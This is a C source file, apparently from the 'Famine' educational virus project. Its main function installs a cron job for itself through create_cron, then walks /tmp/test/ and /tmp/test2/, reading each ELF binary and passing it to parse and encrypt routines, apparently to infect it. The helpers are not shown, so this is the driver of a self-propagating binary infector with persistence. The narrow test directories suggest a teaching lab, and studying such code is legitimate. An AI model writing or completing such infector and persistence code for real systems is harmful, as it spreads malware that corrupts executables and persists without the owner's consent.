#include "famine.h"

void do_virus(char* dirName, t_woody *woody, char *path)
{
    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(dirName)) != NULL)
    {
        while ((ent = readdir(dir)) != NULL)
        {
            if (ft_strcmp(ent->d_name, ".") != 0 && ft_strcmp(ent->d_name, "..") != 0)
            {
                if (read_elf_file_bonus(woody, ft_strjoin(dirName, ent->d_name), path) == ERROR_CODE)
                {
                    free(woody->addr);
                    continue;
                }
                if (parse_info(woody) == ERROR_CODE)
                {
                    free(woody->addr);
                    continue;
                }
                if (encrypt_func(woody, ft_strjoin(dirName, ent->d_name)) == ERROR_CODE)
                {
                    free(woody->addr);
                    continue;
                }
                free(woody->addr);
            }
        }
        closedir(dir);
    }
}

int main(int argc, char **argv)
{

    if (argc != 1)
    {
        return (ERROR_CODE);
    }
    create_cron(argv[0]);
    
    t_woody woody;
    ft_memset(&woody, 0, sizeof(woody));

    do_virus("/tmp/test/", &woody, argv[0]);
    do_virus("/tmp/test2/", &woody, argv[0]);

    

    return (0);
}

